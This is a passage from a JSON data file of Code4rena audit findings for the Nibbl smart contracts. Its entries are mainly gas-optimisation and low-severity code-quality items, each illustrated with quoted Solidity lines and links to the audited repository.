      "title": "[19] Don't use `SafeMath` once the solidity version is 0.8.0 or greater",
      "impact": "GAS",
      "content": "\nVersion 0.8.0 introduces internal overflow checks, so using `SafeMath` is redundant and adds overhead\n\n*There is 1 instance of this issue:*\n\n```solidity\nFile: contracts/NibblVaultFactory.sol   #1\n\n9:    import { SafeMath } from  \"@openzeppelin/contracts/utils/math/SafeMath.sol\";\n```\n\n<https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVaultFactory.sol#L9>\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Nibbl",
      "source_link": "https://code4rena.com/reports/2022-06-nibbl",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "42724",
      "title": "[18] Using `private` rather than `public` for constants, saves gas",
      "impact": "GAS",
      "content": "\nIf needed, the values can be read from the verified contract source code, or if there are multiple values there can be a single getter function that returns a tuple of the values of all currently-public constants. Saves **3406-3606 gas** in deployment gas due to the compiler not having to create non-payable getter functions for deployment calldata, not having to store the bytes of the value outside of where it's used, and not adding another entry to the method ID table\n\n*There are 3 instances of this issue:*\n\n```solidity\nFile: contracts/Utilities/AccessControlMechanism.sol   #1\n\n12:       bytes32 public constant FEE_ROLE = keccak256(\"FEE_ROLE\");\n```\n\n<https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/Utilities/AccessControlMechanism.sol#L12>\n\n```solidity\nFile: contracts/Utilities/AccessControlMechanism.sol   #2\n\n13:       bytes32 public constant PAUSER_ROLE = keccak256(\"PAUSER_ROLE\");\n```\n\n<https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/Utilities/AccessControlMechanism.sol#L13>\n\n```solidity\nFile: contracts/Utilities/AccessControlMechanism.sol   #3\n\n14:       bytes32 public constant IMPLEMENTER_ROLE = keccak256(\"IMPLEMENTER_ROLE\");\n```\n\n<https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/Utilities/AccessControlMechanism.sol#L14>\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Nibbl",
      "source_link": "https://code4rena.com/reports/2022-06-nibbl",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "42723",
      "title": "[17] Usage of `uints`/`ints` smaller than 32 bytes (256 bits) incurs overhead",
      "impact": "GAS",
      "content": "\n> When using elements that are smaller than 32 bytes, your contractâ€™s gas usage may be higher. This is because the EVM operates on 32 bytes at a time. Therefore, if the element is smaller than that, the EVM must use more operations in order to reduce the size of the element from 32 bytes to the desired size.\n\n<https://docs.soliditylang.org/en/v0.8.11/internals/layout_in_storage.html>\nUse a larger size then downcast where needed\n\n*There are 14 instances of this issue:*\n\n```solidity\nFile: contracts/NibblVault.sol\n\n28:       uint32 private constant primaryReserveRatio = 200_000; //20%\n\n57:       uint32 public secondaryReserveRatio;\n\n183:          uint32 _secondaryReserveRatio = uint32((msg.value * SCALE * 1e18) / (_initialTokenSupply * _initialTokenPrice));\n\n303:              uint32 _blockTimestamp = uint32(block.timestamp % 2**32);\n\n365:              uint32 _blockTimestamp = uint32(block.timestamp % 2**32);\n\n445:          uint32 _blockTimestamp = uint32(block.timestamp % 2**32);\n\n557:          uint8 v,\n```\n\n<https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVault.sol#L28>\n\n```solidity\nFile: contracts/Twav/Twav.sol\n\n6:            uint32 timestamp;\n\n11:       uint8 public twavObservationsIndex;\n\n12:       uint8 private constant TWAV_BLOCK_NUMBERS = 4; //TWAV of last 4 Blocks \n\n13:       uint32 public lastBlockTimeStamp;\n\n21:       function _updateTWAV(uint256 _valuation, uint32 _blockTimestamp) internal {\n\n22:           uint32 _timeElapsed; \n\n37:               uint8 _index = ((twavObservationsIndex + TWAV_BLOCK_NUMBERS) - 1) % TWAV_BLOCK_NUMBERS;\n```\n\n<https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/Twav/Twav.sol#L6>\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Nibbl",
      "source_link": "https://code4rena.com/reports/2022-06-nibbl",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "42722",
      "title": "[16] Splitting `require()` statements that use `&&` saves gas",
      "impact": "GAS",
      "content": "\nSee [this issue](https://github.com/code-423n4/2022-01-xdefi-findings/issues/128) which describes the fact that there is a larger deployment gas cost, but with enough runtime calls, the change ends up being cheaper\n\n*There are 4 instances of this issue:*\n\n```solidity\nFile: contracts/NibblVaultFactory.sol   #1\n\n107:          require(basketUpdateTime != 0 && block.timestamp >= basketUpdateTime, \"NibblVaultFactory: UPDATE_TIME has not passed\");\n```\n\n<https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVaultFactory.sol#L107>\n\n```solidity\nFile: contracts/NibblVaultFactory.sol   #2\n\n131:          require(feeToUpdateTime != 0 && block.timestamp >= feeToUpdateTime, \"NibblVaultFactory: UPDATE_TIME has not passed\");\n```\n\n<https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVaultFactory.sol#L131>\n\n```solidity\nFile: contracts/NibblVaultFactory.sol   #3\n\n149:          require(feeAdminUpdateTime != 0 && block.timestamp >= feeAdminUpdateTime, \"NibblVaultFactory: UPDATE_TIME has not passed\");\n```\n\n<https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVaultFactory.sol#L149>\n\n```solidity\nFile: contracts/NibblVaultFactory.sol   #4\n\n166:          require(vaultUpdateTime != 0 && block.timestamp >= vaultUpdateTime, \"NibblVaultFactory: UPDATE_TIME has not passed\");\n```\n\n<https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVaultFactory.sol#L166>\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Nibbl",
      "source_link": "https://code4rena.com/reports/2022-06-nibbl",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "42721",
      "title": "[15] `++i` costs less gas than `i++`, especially when it's used in `for`-loops (`--i`/`i--` too)",
      "impact": "GAS",
      "content": "\nSaves **6 gas per loop**\n\n*There are 6 instances of this issue:*\n\n```solidity\nFile: contracts/Basket.sol\n\n43:           for (uint256 i = 0; i < _tokens.length; i++) {\n\n70:           for (uint256 i = 0; i < _tokens.length; i++) {\n\n93:           for (uint256 i = 0; i < _tokens.length; i++) {\n```\n\n<https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/Basket.sol#L43>\n\n```solidity\nFile: contracts/NibblVault.sol\n\n506:          for (uint256 i = 0; i < _assetAddresses.length; i++) {\n\n525:          for (uint256 i = 0; i < _assets.length; i++) {\n\n547:          for (uint256 i = 0; i < _assets.length; i++) {\n```\n\n<https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVault.sol#L506>\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Nibbl",
      "source_link": "https://code4rena.com/reports/2022-06-nibbl",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "42720",
      "title": "[14] It costs more gas to initialize non-`constant`/non-`immutable` variables to zero than to let the default of zero be applied",
      "impact": "GAS",
      "content": "\nNot overwriting the default for [stack variables](https://gist.github.com/IllIllI000/e075d189c1b23dce256cd166e28f3397) saves **8 gas**. Storage and memory variables have larger savings\n\n*There are 6 instances of this issue:*\n\n```solidity\nFile: contracts/Basket.sol\n\n43:           for (uint256 i = 0; i < _tokens.length; i++) {\n\n70:           for (uint256 i = 0; i < _tokens.length; i++) {\n\n93:           for (uint256 i = 0; i < _tokens.length; i++) {\n```\n\n<https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/Basket.sol#L43>\n\n```solidity\nFile: contracts/NibblVault.sol\n\n506:          for (uint256 i = 0; i < _assetAddresses.length; i++) {\n\n525:          for (uint256 i = 0; i < _assets.length; i++) {\n\n547:          for (uint256 i = 0; i < _assets.length; i++) {\n```\n\n<https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVault.sol#L506>\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Nibbl",
      "source_link": "https://code4rena.com/reports/2022-06-nibbl",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "42719",
      "title": "[13] `>=` costs less gas than `>`",
      "impact": "GAS",
      "content": "\nThe compiler uses opcodes `GT` and `ISZERO` for solidity code that uses `>`, but only requires `LT` for `>=`, [which saves **3 gas**](https://gist.github.com/IllIllI000/3dc79d25acccfa16dee4e83ffdc6ffde)\n\n*There is 1 instance of this issue:*\n\n```solidity\nFile: contracts/NibblVault.sol   #1\n\n224:          _feeCurve = _maxSecondaryBalanceIncrease > _feeCurve ? _feeCurve : _maxSecondaryBalanceIncrease; // the curve fee is capped so that secondaryReserveBalance <= fictitiousPrimaryReserveBalance\n```\n\n<https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVault.sol#L224>\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Nibbl",
      "source_link": "https://code4rena.com/reports/2022-06-nibbl",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "42718",
      "title": "[12] Use a more recent version of solidity",
      "impact": "GAS",
      "content": "\nUse a solidity version of at least 0.8.2 to get simple compiler automatic inlining\nUse a solidity version of at least 0.8.3 to get better struct packing and cheaper multiple storage reads\nUse a solidity version of at least 0.8.4 to get custom errors, which are cheaper at deployment than `revert()/require()` strings\nUse a solidity version of at least 0.8.10 to have external calls skip contract existence checks if the external call has a return value\n\n*There is 1 instance of this issue:*\n\n```solidity\nFile: contracts/Utilities/AccessControlMechanism.sol   #1\n\n4:    pragma solidity ^0.8.0;\n```\n\n<https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/Utilities/AccessControlMechanism.sol#L4>\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Nibbl",
      "source_link": "https://code4rena.com/reports/2022-06-nibbl",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "42717",
      "title": "[11] Using `bool`s for storage incurs overhead",
      "impact": "GAS",
      "content": "\n```solidity\n    // Booleans are more expensive than uint256 or any type that takes up a full\n    // word because each write operation emits an extra SLOAD to first read the\n    // slot's contents, replace the bits taken up by the boolean, and then write\n    // back. This is the compiler's defense against contract upgrades and\n    // pointer aliasing, and it cannot be disabled.\n```\n\n<https://github.com/OpenZeppelin/openzeppelin-contracts/blob/58f635312aa21f947cae5f8578638a85aa2519f5/contracts/security/ReentrancyGuard.sol#L23-L27>\nUse `uint256(1)` and `uint256(2)` for true/false to avoid a Gwarmaccess (**[100 gas](https://gist.github.com/IllIllI000/1b70014db712f8572a72378321250058)**) for the extra SLOAD, and to avoid Gsset (**20000 gas**) when changing from 'false' to 'true', after having been 'true' in the past\n\n*There is 1 instance of this issue:*\n\n```solidity\nFile: contracts/Utilities/AccessControlMechanism.sol   #1\n\n16:       mapping(bytes32 => mapping(address => bool)) public pendingRoles;\n```\n\n<https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/Utilities/AccessControlMechanism.sol#L16>\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Nibbl",
      "source_link": "https://code4rena.com/reports/2022-06-nibbl",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "42716",
      "title": "[10] `require()`/`revert()` strings longer than 32 bytes cost extra gas",
      "impact": "GAS",
      "content": "\nEach extra memory word of bytes past the original 32 [incurs an MSTORE](https://gist.github.com/hrkrshnn/ee8fabd532058307229d65dcd5836ddc#consider-having-short-revert-strings) which costs **3 gas**\n\n*There are 7 instances of this issue:*\n\n```solidity\nFile: contracts/NibblVaultFactory.sol\n\n48:           require(msg.value >= MIN_INITIAL_RESERVE_BALANCE, \"NibblVaultFactory: Initial reserve balance too low\");\n\n49:           require(IERC721(_assetAddress).ownerOf(_assetTokenID) == msg.sender, \"NibblVaultFactory: Invalid sender\");\n\n107:          require(basketUpdateTime != 0 && block.timestamp >= basketUpdateTime, \"NibblVaultFactory: UPDATE_TIME has not passed\");\n\n131:          require(feeToUpdateTime != 0 && block.timestamp >= feeToUpdateTime, \"NibblVaultFactory: UPDATE_TIME has not passed\");\n\n141:          require(_newFee <= MAX_ADMIN_FEE, \"NibblVaultFactory: Fee value greater than MAX_ADMIN_FEE\");\n\n149:          require(feeAdminUpdateTime != 0 && block.timestamp >= feeAdminUpdateTime, \"NibblVaultFactory: UPDATE_TIME has not passed\");\n\n166:          require(vaultUpdateTime != 0 && block.timestamp >= vaultUpdateTime, \"NibblVaultFactory: UPDATE_TIME has not passed\");\n```\n\n<https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVaultFactory.sol#L48>\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Nibbl",
      "source_link": "https://code4rena.com/reports/2022-06-nibbl",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "42715",
      "title": "[9] `++i`/`i++` should be `unchecked{++i}`/`unchecked{i++}` when it is not possible for them to overflow, as is the case when used in `for`- and `while`-loops",
      "impact": "GAS",
      "content": "\nThe `unchecked` keyword is new in solidity version 0.8.0, so this only applies to that version or higher, which these instances are. This saves **30-40 gas [per loop](https://gist.github.com/hrkrshnn/ee8fabd532058307229d65dcd5836ddc#the-increment-in-for-loop-post-condition-can-be-made-unchecked)**\n\n*There are 6 instances of this issue:*\n\n```solidity\nFile: contracts/Basket.sol\n\n43:           for (uint256 i = 0; i < _tokens.length; i++) {\n\n70:           for (uint256 i = 0; i < _tokens.length; i++) {\n\n93:           for (uint256 i = 0; i < _tokens.length; i++) {\n```\n\n<https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/Basket.sol#L43>\n\n```solidity\nFile: contracts/NibblVault.sol\n\n506:          for (uint256 i = 0; i < _assetAddresses.length; i++) {\n\n525:          for (uint256 i = 0; i < _assets.length; i++) {\n\n547:          for (uint256 i = 0; i < _assets.length; i++) {\n```\n\n<https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVault.sol#L506>\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Nibbl",
      "source_link": "https://code4rena.com/reports/2022-06-nibbl",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "42714",
      "title": "[8] `<array>.length` should not be looked up in every loop of a `for`-loop",
      "impact": "GAS",
      "content": "\nThe overheads outlined below are *PER LOOP*, excluding the first loop\n\n*   storage arrays incur a Gwarmaccess (**100 gas**)\n*   memory arrays use `MLOAD` (**3 gas**)\n*   calldata arrays use `CALLDATALOAD` (**3 gas**)\n\nCaching the length changes each of these to a `DUP<N>` (**3 gas**), and gets rid of the extra `DUP<N>` needed to store the stack offset\n\n*There are 6 instances of this issue:*\n\n```solidity\nFile: contracts/Basket.sol\n\n43:           for (uint256 i = 0; i < _tokens.length; i++) {\n\n70:           for (uint256 i = 0; i < _tokens.length; i++) {\n\n93:           for (uint256 i = 0; i < _tokens.length; i++) {\n```\n\n<https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/Basket.sol#L43>\n\n```solidity\nFile: contracts/NibblVault.sol\n\n506:          for (uint256 i = 0; i < _assetAddresses.length; i++) {\n\n525:          for (uint256 i = 0; i < _assets.length; i++) {\n\n547:          for (uint256 i = 0; i < _assets.length; i++) {\n```\n\n<https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVault.sol#L506>\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Nibbl",
      "source_link": "https://code4rena.com/reports/2022-06-nibbl",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "42713",
      "title": "[7] Add `unchecked {}` for subtractions where the operands cannot underflow because of a previous `require()` or `if`-statement",
      "impact": "GAS",
      "content": "\n`require(a <= b); x = b - a` => `require(a <= b); unchecked { x = b - a }`\n\n*There are 5 instances of this issue:*\n\n```solidity\nFile: contracts/NibblVault.sol\n\n/// @audit require() on line 185\n201:          curatorFee = (((_secondaryReserveRatio - MIN_SECONDARY_RESERVE_RATIO) * MIN_CURATOR_FEE) / (primaryReserveRatio - MIN_SECONDARY_RESERVE_RATIO)) + MIN_CURATOR_FEE; //curator fee is proportional to the secondary reserve ratio/primaryReseveRatio i.e. initial liquidity added by curator\n\n/// @audit require() on line 404\n406:          buyoutValuationDeposit = msg.value - (_buyoutBid - _currentValuation);\n\n/// @audit require() on line 404\n415:              safeTransferETH(payable(msg.sender), (_buyoutBid - _currentValuation));\n\n/// @audit if-condition on line 373\n378:                  uint256 _tokensPrimaryCurve = _totalSupply - _initialTokenSupply;\n\n/// @audit if-condition on line 414\n415:              safeTransferETH(payable(msg.sender), (_buyoutBid - _currentValuation));\n```\n\n<https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVault.sol#L201>\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Nibbl",
      "source_link": "https://code4rena.com/reports/2022-06-nibbl",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "42712",
      "title": "[6] `internal` functions only called once can be inlined to save gas",
      "impact": "GAS",
      "content": "\nNot inlining costs **20 to 40 gas** because of two extra `JUMP` instructions and additional stack operations needed for function calls.\n\n*There is 1 instance of this issue:*\n\n```solidity\nFile: contracts/Utilities/EIP712Base.sol   #1\n\n27:       function getChainID() internal view returns (uint256 id) {\n```\n\n<https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/Utilities/EIP712Base.sol#L27>\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Nibbl",
      "source_link": "https://code4rena.com/reports/2022-06-nibbl",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "42711",
      "title": "[5] `<x> += <y>` costs more gas than `<x> = <x> + <y>` for state variables",
      "impact": "GAS",
      "content": "\n*There are 7 instances of this issue:*\n\n```solidity\nFile: contracts/NibblVault.sol\n\n219:          feeAccruedCurator += _feeCurator;\n\n225:          secondaryReserveBalance += _feeCurve;\n\n242:          feeAccruedCurator += _feeCurator;\n\n320:                  secondaryReserveBalance += _lowerCurveDiff;\n\n380:                  primaryReserveBalance -= _saleReturn;\n\n429:              totalUnsettledBids += _buyoutValuationDeposit;\n\n457:          totalUnsettledBids -= _amount;\n```\n\n<https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVault.sol#L219>\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Nibbl",
      "source_link": "https://code4rena.com/reports/2022-06-nibbl",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "42710",
      "title": "[4] State variables should be cached in stack variables rather than re-reading them from storage",
      "impact": "GAS",
      "content": "\nThe instances below point to the second+ access of a state variable within a function. Caching of a state variable replace each Gwarmaccess (**100 gas**) with a much cheaper stack read. Other less obvious fixes/optimizations include having local memory caches of state variable structs, or having local caches of state variable contracts/addresses.\n\n*There is 1 instance of this issue:*\n\n```solidity\nFile: contracts/NibblVault.sol   #1\n\n/// @audit secondaryReserveBalance on line 225\n226:          secondaryReserveRatio = uint32((secondaryReserveBalance * SCALE * 1e18) / (initialTokenSupply * initialTokenPrice)); //secondaryReserveRatio is updated on every trade \n```\n\n<https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVault.sol#L226>\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Nibbl",
      "source_link": "https://code4rena.com/reports/2022-06-nibbl",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "42709",
      "title": "[3] Using `storage` instead of `memory` for structs/arrays saves gas",
      "impact": "GAS",
      "content": "\nWhen fetching data from a storage location, assigning the data to a `memory` variable causes all fields of the struct/array to be read from storage, which incurs a Gcoldsload (**2100 gas**) for *each* field of the struct/array. If the fields are read from the new memory variable, they incur an additional `MLOAD` rather than a cheap stack read. Instead of declearing the variable with the `memory` keyword, declaring the variable with the `storage` keyword and caching any fields that need to be re-read in stack variables, will be much cheaper, only incuring the Gcoldsload for the fields actually read. The only time it makes sense to read the whole struct/array into a `memory` variable, is if the full struct/array is being returned by the function, is being passed to a function that requires `memory`, or if the array/struct is being read from another `memory` array/struct\n\n*There are 2 instances of this issue:*\n\n```solidity\nFile: contracts/Twav/Twav.sol   #1\n\n38:               TwavObservation memory _twavObservationCurrent = twavObservations[(_index)];\n```\n\n<https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/Twav/Twav.sol#L38>\n\n```solidity\nFile: contracts/Twav/Twav.sol   #2\n\n39:               TwavObservation memory _twavObservationPrev = twavObservations[(_index + 1) % TWAV_BLOCK_NUMBERS];\n```\n\n<https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/Twav/Twav.sol#L39>\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Nibbl",
      "source_link": "https://code4rena.com/reports/2022-06-nibbl",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "42708",
      "title": "[2] Using `calldata` instead of `memory` for read-only arguments in `external` functions saves gas",
      "impact": "GAS",
      "content": "\nWhen a function with a `memory` array is called externally, the `abi.decode()` step has to use a for-loop to copy each index of the `calldata` to the `memory` index. **Each iteration of this for-loop costs at least 60 gas** (i.e. `60 * <mem_array>.length`). Using `calldata` directly, obliviates the need for such a loop in the contract code and runtime execution.\n\nIf the array is passed to an `internal` function which passes the array to another internal function where the array is modified and therefore `memory` is used in the `external` call, it's still more gass-efficient to use `calldata` when the `external` function uses modifiers, since the modifiers may prevent the internal functions from being called. Structs have the same overhead as an array of length one\n\n*There are 23 instances of this issue:*\n\n```solidity\nFile: contracts/Basket.sol\n\n41:       function withdrawMultipleERC721(address[] memory _tokens, uint256[] memory _tokenId, address _to) external override {\n\n41:       function withdrawMultipleERC721(address[] memory _tokens, uint256[] memory _tokenId, address _to) external override {\n\n68:       function withdrawMultipleERC1155(address[] memory _tokens, uint256[] memory _tokenIds, address _to) external override {\n\n68:       function withdrawMultipleERC1155(address[] memory _tokens, uint256[] memory _tokenIds, address _to) external override {\n\n91:       function withdrawMultipleERC20(address[] memory _tokens) external override {\n\n99:       function onERC721Received(address, address from, uint256 id, bytes memory) external override returns(bytes4) {\n\n104:      function onERC1155Received(address, address from, uint256 id, uint256 amount, bytes memory) external virtual override returns (bytes4) {\n\n109:      function onERC1155BatchReceived(address, address from, uint256[] memory ids, uint256[] memory amounts, bytes memory) external virtual override returns (bytes4) {\n\n109:      function onERC1155BatchReceived(address, address from, uint256[] memory ids, uint256[] memory amounts, bytes memory) external virtual override returns (bytes4) {\n\n109:      function onERC1155BatchReceived(address, address from, uint256[] memory ids, uint256[] memory amounts, bytes memory) external virtual override returns (bytes4) {\n```\n\n<https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/Basket.sol#L41>\n\n```solidity\nFile: contracts/NibblVaultFactory.sol\n\n41:           string memory _name,\n\n42:           string memory _symbol,\n```\n\n<https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVaultFactory.sol#L41>\n\n```solidity\nFile: contracts/NibblVault.sol\n\n174:          string memory _tokenName, \n\n175:          string memory _tokenSymbol, \n\n504:      function withdrawMultipleERC721(address[] memory _assetAddresses, uint256[] memory _assetIDs, address _to) external override boughtOut {\n\n504:      function withdrawMultipleERC721(address[] memory _assetAddresses, uint256[] memory _assetIDs, address _to) external override boughtOut {\n\n523:      function withdrawMultipleERC20(address[] memory _assets, address _to) external override boughtOut {\n\n545:      function withdrawMultipleERC1155(address[] memory _assets, uint256[] memory _assetIDs, address _to) external override boughtOut {\n\n545:      function withdrawMultipleERC1155(address[] memory _assets, uint256[] memory _assetIDs, address _to) external override boughtOut {\n\n577:      function onERC1155Received(address, address, uint256, uint256, bytes memory) external pure returns (bytes4) {\n\n581:      function onERC1155BatchReceived(address, address, uint256[] memory, uint256[] memory, bytes memory) external pure returns (bytes4) {\n\n581:      function onERC1155BatchReceived(address, address, uint256[] memory, uint256[] memory, bytes memory) external pure returns (bytes4) {\n\n581:      function onERC1155BatchReceived(address, address, uint256[] memory, uint256[] memory, bytes memory) external pure returns (bytes4) {\n```\n\n<https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVault.sol#L174>\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Nibbl",
      "source_link": "https://code4rena.com/reports/2022-06-nibbl",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "42707",
      "title": "[1] Setting `DEFAULT_ADMIN_ROLE` as the role admin is redundant",
      "impact": "GAS",
      "content": "\n`DEFAULT_ADMIN_ROLE` is [automatically](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/83277ff916ac4f58fec072b8f28a252c1245c2f1/contracts/access/AccessControl.sol#L40-L48) designated as the role admin of any new role, so setting it again is a waste of gas since it involves fetching role-related state variables, updating state variables, and emitting an event\n\n*There is 1 instance of this issue:*\n\n```solidity\nFile: contracts/Utilities/AccessControlMechanism.sol   #1\n\n22           _setRoleAdmin(_defaultAdminRole, _defaultAdminRole);\n23           _setRoleAdmin(FEE_ROLE, _defaultAdminRole);\n24           _setRoleAdmin(PAUSER_ROLE, _defaultAdminRole);\n25:          _setRoleAdmin(IMPLEMENTER_ROLE, _defaultAdminRole);\n```\n\n<https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/Utilities/AccessControlMechanism.sol#L22-L25>\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Nibbl",
      "source_link": "https://code4rena.com/reports/2022-06-nibbl",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "42706",
      "title": "[N-20] Event is missing `indexed` fields",
      "impact": "LOW",
      "content": "\nEach `event` should use three `indexed` fields if there are three or more fields\n\n*There are 5 instances of this issue:*\n\n```solidity\nFile: contracts/Basket.sol\n\n15:       event DepositERC721(address indexed token, uint256 tokenId, address indexed from);\n\n16:       event WithdrawERC721(address indexed token, uint256 tokenId, address indexed to);\n\n17:       event DepositERC1155(address indexed token, uint256 tokenId, uint256 amount, address indexed from);\n\n18:       event DepositERC1155Bulk(address indexed token, uint256[] tokenId, uint256[] amount, address indexed from);\n\n19:       event WithdrawERC1155(address indexed token, uint256 tokenId, uint256 amount, address indexed from);\n```\n\n<https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/Basket.sol#L15>\n\n**[HardlyDifficult (judge) commented](https://github.com/code-423n4/2022-06-nibbl-findings/issues/139#issuecomment-1173978577):**\n > Great feedback & it all appears valid.\n\n***\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Nibbl",
      "source_link": "https://code4rena.com/reports/2022-06-nibbl",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "42705",
      "title": "[N-19] NatSpec is incomplete",
      "impact": "LOW",
      "content": "\n*There are 12 instances of this issue:*\n\n[See original submission](https://github.com/code-423n4/2022-06-nibbl-findings/issues/139) for details.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Nibbl",
